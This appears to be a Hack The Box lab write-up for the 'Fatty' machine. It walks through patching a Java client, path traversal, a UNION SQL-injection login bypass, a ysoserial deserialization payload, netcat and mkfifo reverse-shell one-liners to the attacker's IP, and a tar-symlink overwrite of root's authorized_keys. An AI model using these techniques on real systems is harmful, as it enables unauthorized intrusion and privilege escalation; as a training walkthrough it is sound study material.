[Fatty](https://www.hackthebox.eu/home/machines/profile/227) is an insane linux box by [qtc](https://www.hackthebox.eu/home/users/profile/103578).

### Overview

The box starts with ftp-enumeration, where we find some notes and a java client. In order to use the client, we have to patch the client multiple times. Decompiling the client, we find a possible traversal vulnerability, which with some modifications we can exploit to download the server's source code.

Decompiling the server, we can search for a SQL-injection, which was hinted by a note we found earlier. We can locate the SQL-injection in the server's code that handles the login. The supplied username is directly used in a select-query without any sanitization. Using the SQL-injection, we can escalate our session-privileges to administrative access, which allows us to access further functionalities of the client.

Further enumeration of one of the newly accessible functionalities (changing the user's password), we can find a deserialization-vulnerability in the server's source code. Using ysoserial, we can create a payload that allows us to get a reverse-shell upon deserialization. Now that we have a reverse-shell on the docker-container as the user, we can read user.txt.

In order to escalate our privileges to root, we have to exploit a cronjob that transfers and extract logfiles from the docker-container to the real host. For this we archive a symlink that upon extraction overwrites the old extraction point. This way upon the next transfer of the logfiles we get arbitrary file-write as root. In order to get a shell, we first write the location for the root-user's authorized_keys to the extraction point. Then we write our ssh-key to the extraction point, which overwrites the authorized_keys file, giving us ssh-access as the user root. Logging in using ssh, we get a shell as root and can read root.txt.

## Information Gathering

### Nmap
We begin our enumeration with a nmap scan for open ports.

```bash
root@darkness:~# nmap -sC -sV 10.10.10.174
Nmap scan report for 10.10.10.174

```

## Enumeration

The standard nmap scan shows that **21** and **22** are the only open ports. Furthermore, nmap tells us that anonymous FTP-access is allowed. The full port scan shows three additional ports (**1337**, **1338** and **1339**). Let us check out FTP, before we continue to enumerate the other ports.

### FTP - Port 21

Using our anonymous access, we can access ftp and download the files available.

```bash
root@darkness:~# ftp 10.10.10.174
Connected to 10.10.10.174.

-rw-r--r--    1 ftp      ftp           194 Oct 30  2019 note3.txt
226 Directory send OK.
```

Having downloaded all files, let us read the notes, before we start checking out the **fatty-client.jar** file.

```bash
root@darkness:~# cat note.txt 
Dear members, 

because of some security issues we moved the port of our fatty java server from 8000 to the hidden and undocumented port 1337. 
Furthermore, we created two new instances of the server on port 1338 and 1339. They offer exactly the same server and it would be nice
if you use different servers from day to day to balance the server load. 

We were too lazy to fix the default port in the '.jar' file, but since you are all senior java developers you should be capable of 
doing it yourself ;)

Best regards,
qtc
```

Note.txt tells us that the three found ports are all running the `fatty java server`. Furthermore, it seems like we have to fix the port ourselves in order to use the binary.

```bash
root@darkness:~# cat note2.txt 
Dear members, 

we are currently experimenting with new java layouts. The new client uses a static layout. If your
are using a tiling window manager or only have a limited screen size, try to resize the client window
until you see the login from.

Furthermore, for compatibility reasons we still rely on Java 8. Since our company workstations ship Java 11
per default, you may need to install it manually.

Best regards, 
qtc
```

The second note tells us that the binary is running java 8. In order to run it, we will have to install this version of java on our system.

```bash
root@darkness:~# cat note3.txt
Dear members, 

We had to remove all other user accounts because of some seucrity issues.
Until we have fixed these issues, you can use my account:

User: qtc
Pass: clarabibi

Best regards,
qtc
```

The third and final note gives us credentials, we can use to work with the java client.



## Decompiling the java client

Now that we have gathered some basic information about the java client, let us use [JD-GUI](http://java-decompiler.github.io/) to decompile the java project.

Opening up the project in JD-GUI, we get an overview of all files.

![JD-GUI overview](/assets/htb/Fatty/jd-projectroot.png)

We have a couple of java-classes, a beans.xml file and a PKCS #12 archive. Looking at the beans.xml file, we can see that the client is connecting to `server.fatty.htb` on port `8000`. We can add this hostname to our /etc/hosts file. Furthermore, we can see that the client uses the fatty.p12 key and the  secret of `clarabibiclarabibiclarabibi`.



### Patching incorrect port

Now that we have an overview of the project file, let us patch the port so we can actually run the client. Let us extract the java-archive in order to patch the incorrect port.

```bash
root@darkness:~# cp fatty-client.jar fatty-client.zip; unzip fatty-client.zip
Archive:  fatty-client.zip 
  inflating: META-INF/MANIFEST.MF    
  inflating: META-INF/1.SF            
  inflating: META-INF/1.RSA           
  [...]
  extracting: beans.xml
  extracting: exit.png                 
  extracting: fatty.p12                
  creating: htb/
  creating: htb/fatty/
  creating: htb/fatty/client/
  creating: htb/fatty/client/gui/
  [...]
```

Next we have to change the port in the beans.xml file.

```bash
root@darkness:~# sed -i 's/8000/1337/g' beans.xml
```

Now we have to create the java archive again:

```bash
root@darkness:~# jar cf fatty-client-new.jar .
```

We can also simply update files within the java archive like this:

```bash
root@darkness:~# jar uf fatty-client.jar beans.xml
```

Finally, we have to sign the archive again. For this we need to get the key for signing. Luckily it is hardcoded in the `TrustedFatty.class` file.

![PKCS 12 Key](/assets/htb/Fatty/jd-pkcs12key.png)



The key used is `secureclarabibi123`. We now can use jarsigner to sign the jar file.

```bash
root@darkness:~# jarsigner -storetype pkcs12 -keystore fatty.p12 fatty-client.jar 1
Enter Passphrase for keystore: secureclarabibi123
jar signed.

Warning: 
The signer's certificate is self-signed.
```

Now that we have signed the client, we can run it.

```bash
root@darkness:~# java8 -jar fatty-client.jar
```

![Client login](/assets/htb/Fatty/client-login.png)

Upon running the client, we get to the login view, where we can use the credentials from the note file.

![Login successful](/assets/htb/Fatty/client-login-ok.png)

After logging in, we get to the main page, where we now can use the option-bar above to select various actions.

![Client menu](/assets/htb/Fatty/client-menu.png)

We have two interesting functionalities available: Profile > whoami and the FileBrowser. The whoami simply displays our usernames and the FileBrowser functionality seems to let us read data from the server.



### Enumerating the FileBrowser functionality

![List dir](/assets/htb/Fatty/client-file-dir.png)

The FileBrowser has three different directories we can list: `Configs`,`Notes` and `Mail`. We can then use the textbox at the bottom to specify one of the files to read.

![Read files](/assets/htb/Fatty/client-file-read.png)

Checking out the files, we have two interesting files: `report.txt` (talking about security issues in the client) and `dave.txt` (talking about possible SQL-injections).

Dave.txt:

```
Hey qtc, 

until the issues from the current pentest are fixed we have removed all administrative users from the database.
Your user account is the only one that is left. Since you have only user permissions, this should prevent exploitation
of the other issues. Furthermore, we implemented a timeout on the login procedure. Time heavy SQL injection attacks are
therefore no longer possible.

Best regards,
Dave
```

Let us try to read a non-existing file and see if we get any interesting behavior.

![Path leak](/assets/htb/Fatty/client-path-leak.png)

Using a non-existing file leaks our current directory on the server: `/opt/fatty/files/mail/`.

Let us check out the source-code for the file-read.

![Source code for file-read](/assets/htb/Fatty/jd-file-gui.png)

Checking out the file `ClientGuiTest.class`, we can see that in order to list the directories the function `invoker.showFiles(directory)` and to read the file the function `invoker.open(folder, fileName) `is called. What catches my eye is the line 447: `fileName.replaceAll("[^a-zA-Z0-9.]", "");` which seems to be an input filter. If the filtering is only done client-sided, we can remove this line and possibly exploit a path-traversal.

Checking out the `Invoker.class` file, we have the `showFiles` and `open` function.

![File-read class](/assets/htb/Fatty/jd-file-class.png)



### Patching filename filter

Let us patch the file-name filter, so we can arbitrary define filenames, which may give us path-traversal. Furthermore, let us patch the fileBrowser, so it reads the directory from the input field (which possibly allows us to get directory-traversal).

For this we simply copy the java-code from JD-GUI, save it to a file and change the `mail.addActionListener(...)` function to the following code.

```java
leak.addActionListener(new ActionListener() {
          public void actionPerformed(ActionEvent e) {
            String response = "";
            String folder = ClientGuiTest.this.fileTextField.getText();
            ClientGuiTest.this.currentFolder = folder;
            try {
              response = ClientGuiTest.this.invoker.showFiles(folder);
            } catch([...]) {
                [...]
            }
            textPane.setText(response);
          }
        });
```

Now we have to compile the newly created using javac.

```bash
root@darkness:~# javac8 htb/fatty/client/gui/ClientGuiTest.java
```

This creates following class files:

```bash
root@darkness:~# ls htb/fatty/client/gui/
'ClientGuiTest$10.class'  'ClientGuiTest$16.class'  'ClientGuiTest$3.class'  'ClientGuiTest$9.class'
'ClientGuiTest$11.class'  'ClientGuiTest$17.class'  'ClientGuiTest$4.class'   ClientGuiTest.class
'ClientGuiTest$12.class'  'ClientGuiTest$18.class'  'ClientGuiTest$5.class'   ClientGuiTest.java
'ClientGuiTest$13.class'  'ClientGuiTest$19.class'  'ClientGuiTest$6.class'
'ClientGuiTest$14.class'  'ClientGuiTest$1.class'   'ClientGuiTest$7.class'
'ClientGuiTest$15.class'  'ClientGuiTest$2.class'   'ClientGuiTest$8.class'
```

Now we simply have to update the jar archive to use all these class files instead, sign it again and run it.

```bash
root@darkness:~# jar uf fatty-client.jar htb/fatty/client/gui/*
root@darkness:~# jarsigner -storetype pkcs12 -keystore fatty.p12 fatty-client.jar 1
Enter Passphrase for keystore: secureclarabibi123
jar signed.

Warning: 
The signer's certificate is self-signed.
root@darkness:~# java8 -jar fatty-client.jar
```

![Leak dir menu](/assets/htb/Fatty/client-file-dir-leak.png)

The client now has the Leak instead of the Mail menu.



### Exploiting path traversal

Using `..` as the wanted directory, we can now try to traverse our directory.

![Path traversal successful](/assets/htb/Fatty/client-dir-traversal.png)

We get a new listing of a directory we have not seen before. Our previous directory was `files`. The file `fatty-server.jar` seems the most interesting.

![File-read with traversal successful](/assets/htb/Fatty/client-dir-traversal-read.png)

After changing our directory, we can read the `start.sh` file.

Reading the `fatty-server.jar` does not give us any output, which makes sense as the file won't be printable text. Let us change to `open` function to saving data to a file, instead of reading it. This way we can extract the source-code from the server.



### Patching file read to download server

In order to write data as a file, we need to create a new function that does the same as the `Invoker.open` function, but instead of calling `response = this.response.getContentAsString();`, we use `response = this.response.getContent();`. This gives us the response as bytes. Now we can use FileOutputStream to write the bytes to a file.

```java
public String downloadServer() throws MessageParseException, MessageBuildException, IOException {
    this.action = new ActionMessage(this.sessionID, "open");
    
    String foldername = "../";
    String filename = "fatty-server.jar";

    this.action.addArgument(foldername);
    this.action.addArgument(filename);

    sendAndRecv();
    if (this.response.hasError())
      return "Error while communicating with server";
    
    try
    {
      String output_file = "fatty-server.jar";
      FileOutputStream fos = new FileOutputStream(output_file);
      fos.write(this.response.getContent());
      return "Downloaded server!";
    }
    catch (Exception e)
    {
      e.printStackTrace();
      return "Error while trying to download the server!";
    }
  }
```

The code above will we added to the `Invoker.class` class. Now we have to call this function in the GUI class. We can simply change the Notes button to instead execute our code.

```java
dlserv.addActionListener(new ActionListener() {
          public void actionPerformed(ActionEvent e) {
            try {
              String response = ClientGuiTest.this.invoker.downloadServer();
              textPane.setText(response);
            } catch (Exception ex) {
              JOptionPane.showMessageDialog(controlPanel, ex.getMessage(), "Error", 0);
            } 
          }
        });
```

The code above will be added to the `ClientGuiTest.class` class.

Same as before, we now have to compile the classes again and update the jar archive.

```bash
root@darkness:~# javac8 htb/fatty/client/methods/Invoker.java
root@darkness:~# javac8 htb/fatty/client/gui/ClientGuiTest.java
root@darkness:~# jar uf fatty-client.jar htb/fatty/client/gui/*
root@darkness:~# jar uf fatty-client.jar htb/fatty/client/methods/*
root@darkness:~# jarsigner -storetype pkcs12 -keystore fatty.p12 fatty-client.jar 1
Enter Passphrase for keystore: secureclarabibi123
jar signed.

Warning: 
The signer's certificate is self-signed.
root@darkness:~# java8 -jar fatty-client.jar
```

![Server downloaded](/assets/htb/Fatty/client-server-download.png)

We now have the server downloaded in the same directory, where we launched the client:

```bash
root@darkness:~# ls -lh
total 26M
-rw-r--r-- 1 root root 1.6K Jul 26 19:18 beans.xml

```



## Decompiling the java server

Now that we have the fatty server downloaded, let us check out the source in JD-GUI.

![Server in JD-GUI](/assets/htb/Fatty/jd-server-project.png)

Seems like we have a couple of server-specific classes. Remembering back to the dave.txt file, there should be a SQL-injection somewhere. `FattyDbSession.class` sounds very interesting, so let us start searching here.

![SQL-injection in server-code](/assets/htb/Fatty/jd-server-sqli.png)

The SQL-injection vulnerability is located in the `checkLogin` function. The inputted username is directly inputted in the select query. We also get the fields of the users table from the source-code. Especially the role field seems interesting, as it probably defines our privileges. Let us see, where this field is evaluated.

We can see which roles are available by checking the `getRoleByName` function in the `Role.class` file.

```java
 public static Role getRoleByName(String name) {
    if (name.equalsIgnoreCase("admin"))
      return getAdminRole(); 
    if (name.equalsIgnoreCase("user"))
      return getUserRole(); 
    System.out.println(name);
    return getAnonymous();
  }
```

Seems like there are three roles: **admin**, **user** and **anonymous**.



Another function worth looking at is the constructor of the User object.

![User class](/assets/htb/Fatty/jd-server-user-class.png)

Upon creating the user, a secret salt (or in this case pepper as it is kept secret) is appended to the inputted user and password. This string is then hashed using SHA256. This is useful information, if we would have to write a password-cracker or wanted to create our own password. Let us this information to create the hash of the qtc user.

```bash
root@darkness:~# hash=$(echo -n "qtcclarabibiclarabibimakeseverythingsecure" | sha256sum)
root@darkness:~# echo ${hash^^} | cut -d ' ' -f1
5A67EA356B858A2318017F948BA505FD867AE151D6623EC32BE86E9C688BF046
```

Now that we have gathered enough information about the database-backend and the information formatting, let us exploit the SQL-injection to get administrative access.

### Getting admin access by exploiting the SQL-injection

The SQL-query that is executed upon login looks as follows:

```sql
SELECT id,username,email,password,role FROM users WHERE username='INPUT'
```

We control the INPUT part of this query. We can use a UNION injection to change the output of the query, which allows us to change our current role to admin.

We have to supply id,username,email,password and the role we want to have.

In our case this would be: `<NUMBER>,qtc,'chronos',password,'admin'`.

The full SQLi payload looks like this:

```sql
'UNION ALL SELECT 2,'admin','chronos','password','admin' FROM users;#
```

We can add this code to the `ClientGuiTest.class` file.

Upon clicking the login button instead of doing this:

```java
String username = ClientGuiTest.this.tfUsername.getText().trim();
String password = new String(ClientGuiTest.this.tfPassword.getPassword());
ClientGuiTest.this.user = new User();
ClientGuiTest.this.user.setUsername(username);
ClientGuiTest.this.user.setPassword(password);
```

We simply run the SQL-injection:

```java
String sqli = "'UNION ALL SELECT 2,'admin','chronos','password','admin' FROM users;#";
ClientGuiTest.this.tfUsername.setText(sqli);
ClientGuiTest.this.tfPassword.setText("password");
ClientGuiTest.this.user = new User(sqli, "password", false);
```

As before, we compile the class, overwrite the jar file, sign and run the client.

![SQLi](/assets/htb/Fatty/client-sqli.png)

We can verify that our SQL-injection was successful by using the Profile > whoami menu.

![SQLi successful](/assets/htb/Fatty/client-sqli-ok.png)

We now have the role admin and have full access to all menus. The only new functionality that is really interesting is Profile > ChangePassword.

![Change password](/assets/htb/Fatty/client-changePw.png)

Let us check out the source code of the client and the server for the ChangePassword functionality.

### Enumeration of the ChangePassword functionality

The changePw action is handled in the `Commands.class` class on the server.

```java
public static String changePW(ArrayList<String> args, User user) {
    [...]
    String response = "";
    String b64User = args.get(0);
    byte[] serializedUser = Base64.getDecoder().decode(b64User.getBytes());
    ByteArrayInputStream bIn = new ByteArrayInputStream(serializedUser);
    try {
      ObjectInputStream oIn = new ObjectInputStream(bIn);
      User user1 = (User)oIn.readObject();
    } catch (Exception e) {
      [...]
    } 
    [...]
  }
```

The server reads in the serialized user and deserializes it. If we are able to control the data that is being deserialized, we can get remote code execution.

The changePw action is handled in the `Invoker.class` on the client.

```java
public String changePW(String username, String newPassword) [..] {
    [...]
    User user = new User(username, newPassword);
    ByteArrayOutputStream bOut = new ByteArrayOutputStream();
    try {
      ObjectOutputStream oOut = new ObjectOutputStream(bOut);
      oOut.writeObject(user);
    } catch (IOException e) {
      e.printStackTrace();
      return "Failure while serializing user object";
    } 
    byte[] serializedUser64 = Base64.getEncoder().encode(bOut.toByteArray());
    this.action = new ActionMessage(this.sessionID, "changePW");
    this.action.addArgument(new String(serializedUser64));
    sendAndRecv();
    if (this.response.hasError())
      return "Error: Your action caused an error on the application server!"; 
    return this.response.getContentAsString();
  }
```

The username and password is used as an argument. A new user-object is created and it is serialized. Then it is base64-encoded and transferred to the server. We control the password in this specific case and therefore can exploit the deserialization vulnerability. We just have to change the changePw function to simply pass the payload to server:

```java
public String changePW(String username, String newPassword) throws [...] {
    this.action = new ActionMessage(this.sessionID, "changePW");
    this.action.addArgument(newPassword); //Insert deserialization payload here
    sendAndRecv();
    if (this.response.hasError())
      return "Error!";
    return this.response.getContentAsString();
  }
```

And change the GUI to actually call the method.

```java
pwChangeButton.addActionListener(new ActionListener() {
          public void actionPerformed(ActionEvent e) {
            String username = "chronos";
            String password = ClientGuiTest.this.textField_2.getText();
            try {
              ClientGuiTest.this.invoker.changePW(username, password);
            } catch (Exception ex) {
              return;
            }
          }
        });
```

Now we again have to patch the client. You can find the fully patched client, as well as the modified source code and a script to quickly patch the client on my [GitHub](https://github.com/chr0x6eos/HTB/tree/master/Fatty).

### Exploiting the deserialization vulnerability

Now that we know that we have a deserialization vulnerability in the ChangePassword functionality, we simply have to create a java-deserialization-payload. For this we can use [ysoserial](https://github.com/frohoff/ysoserial). Let us assume that netcat is installed on the system. With this we can generate a payload using following command:

```bash
root@darkness:~# java -jar ysoserial.jar CommonsCollections5 'nc 10.10.14.8 443 -e /bin/sh'| base64 -w 0
<BASE-64 PAYLOAD>
```

![Reverse-shell payload](/assets/htb/Fatty/client-revshell.png)

Now we just have to enter the base64 payload into the password field and start our listener.

```bash
root@darkness:~# nc -lvnp 443
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.174.
Ncat: Connection from 10.10.10.174:36287.
whoami
qtc
```

We get a response back and now have a shell as qtc. Let us upgrade the shell for easier usage:

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.8 443 >/tmp/f &
```

```
root@darkness:~# rlwrap nc -lvnp 443
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.174.
Ncat: Connection from 10.10.10.174:36793.
/bin/sh: can't access tty; job control turned off
2f265ce12800:/home/qtc$ 
```

Upgrading the shell shows the hostname `2f265ce12800`. The strange hostname could mean that we are in a container. Let us further enumerate the machine and see if we can already read user.txt.

```bash
2f265ce12800:/home/qtc$ ls -alh
total 16
drwxr-sr-x    1 qtc      qtc         4.0K Oct 30  2019 .
drwxr-xr-x    1 root     root        4.0K Oct 30  2019 ..
drwx------    1 qtc      qtc         4.0K Oct 30  2019 .ssh
----------    1 qtc      qtc           33 Oct 30  2019 user.txt
2f265ce12800:/home/qtc$ chmod 400 user.txt
2f265ce12800:/home/qtc$ cat user.txt
7fab2***************************
```

The user.txt flag is not readable, however as we are the owner of the file, we can quickly change the permissions and read the file.

## Privesc to root

Now that we have a shell as user, let us enumerate the system, to find a privilege escalation vector.

### Enumeration as qtc

Let us upload pspy to the server and run it.

```bash
2f265ce12800:/tmp$ wget 10.10.14.8/pspy64

```

Seems like the user qtc regularly copies the `/opt/fatty/tar/logs.tar` tar archive somewhere on the real host.

We can check out the `/opt/fatty/tar` directory.

```bash
2f265ce12800:/opt/fatty$ ls -lh
total 10592
-rw-r--r--    1 root     root       10.3M Oct 30  2019 fatty-server.jar

-rw-r--r--    1 qtc      qtc        21.0K Jul 27 09:00 logs.tar
```

Let us transfer the file to our machine using netcat.

```bash
2f265ce12800:/opt/fatty/tar$ cat logs.tar | nc 10.10.14.8 1234
```

```bash
root@darkness:~# nc -lvnp 1234 > logs.tar
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::1234
Ncat: Listening on 0.0.0.0:1234
Ncat: Connection from 10.10.10.174.
Ncat: Connection from 10.10.10.174:39273.
```

Let us check out the archive now.

```bash
root@darkness:~# tar xvf logs.tar
opt/fatty/logs/
opt/fatty/logs/error-log.txt
opt/fatty/logs/info-log.txt
```

The archive contains log files. Seems like the cronjob that copies the files via scp is a simple backup implementation between the container and the host.

### Exploiting the backup process

We can assume that the archived data is copied somewhere and unpacked. We can exploit this by creating a symbolic link to a file we want to overwrite upon extraction. We can simply use `/root/.ssh/authorized_keys` to add our public key.

The exploitation process will happen like this:

1.) Overwriting backup location

Upon extraction the logs.tar file points to /root/.ssh/authorized_keys. `logs.tar -> /root/.ssh/authorized_keys`.

2.) Overwriting target file

Upon the second extraction the contents of the logs.tar file from the container is written to `/root/.ssh/authorized_keys`.



For this we have to first create the symbolic link, then pack the file in a tar archive and upload it to `/opt/fatty/tar/logs.tar`. We then have to wait for the archive to be uploaded. After the archive being uploaded, we overwrite the archive with our public-key.

```bash
root@darkness:~# ln -s /root/.ssh/authorized_keys logs.tar
root@darkness:~# ls -lh logs.tar 
lrwxrwxrwx 1 root root 26 Jul 27 11:35 logs.tar -> /root/.ssh/authorized_keys
root@darkness:~# tar cf logs2.tar logs.tar 
root@darkness:~# mv logs2.tar logs.tar
```

Now we have a logs.tar archive that contains a logs.tar file that points to `/root/.ssh/authorized_keys`.

```bash
root@darkness:~# ssh-keygen -f id_rsa -N ""

The key's randomart image is:
+---[RSA 3072]----+
|**++.            |
|B+o .            |

|* o .. o . .     |
|o+ o      .      |
|=oo              |
+----[SHA256]-----+
```

We can now upload the file and look at our pspy output to see when it is being copied.

```bash
2f265ce12800:/opt/fatty/tar$ wget 10.10.14.8/logs.tar
Connecting to 10.10.14.8 (10.10.14.8:80)
logs.tar             100% |********************************| 10240  0:00:00 ETA
```

After the file is copied, we can overwrite the archive with our ssh-key.

```bash
2f265ce12800:/opt/fatty/tar$ echo 'ssh-rsa AAAAB[...]/Ubas=' > logs.tar
```

Now we have to wait again for the public-key to be transferred.

```bash
root@darkness:~# ssh -i id_rsa root@10.10.10.174
Linux fatty 4.9.0-11-amd64 #1 SMP Debian 4.9.189-3+deb9u1 (2019-09-20) x86_64
[...]
Last login: Wed Jan 29 12:31:22 2020
root@fatty:~#
```

After waiting a bit, we can ssh to the server as root.

```bash
root@fatty:~# ls -lh
total 24K
drwxr-xr-x 4 root root 4.0K Jul 27 11:51 client1
drwxr-xr-x 4 root root 4.0K Jul 27 11:51 client2
drwxr-xr-x 4 root root 4.0K Jul 27 11:51 client3

-rw------- 1 root root   33 Oct 30  2019 root.txt
```

Now as we have a shell as root, we can read root.txt.

```bash
root@fatty:~# cat root.txt
